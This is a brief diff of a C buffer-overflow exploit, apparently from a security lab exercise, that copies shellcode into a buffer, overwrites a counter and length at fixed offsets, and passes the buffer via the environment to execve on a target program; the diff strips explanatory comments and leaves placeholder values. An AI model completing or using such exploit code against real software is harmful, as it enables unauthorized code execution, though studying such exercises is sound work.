@@ -47,10 +47,8 @@ main ( int argc, char * argv[] )
         buf[i] = shellcode[i-19];
     }
 
-    //write 267 to i = 0x010b (the 0x01 part is already on the stack at &i because the current value of i is 0x0108 =264)
     buf[264] = '\x0b';
 
-    // write '283' = 0x011b to len starting at buf[264]
     buf[xxx] = '\xxx';
     buf[xxx] = '\xxx';
     buf[xxx] = '\xxx';
@@ -59,7 +57,6 @@ main ( int argc, char * argv[] )
     args[2] = NULL;
 
     env[0] = &buf[xxx];
-    // save buf address 0x2021fd40
     env[1] = xxx;
 
     if ( execve (TARGET, args, env) < 0 )
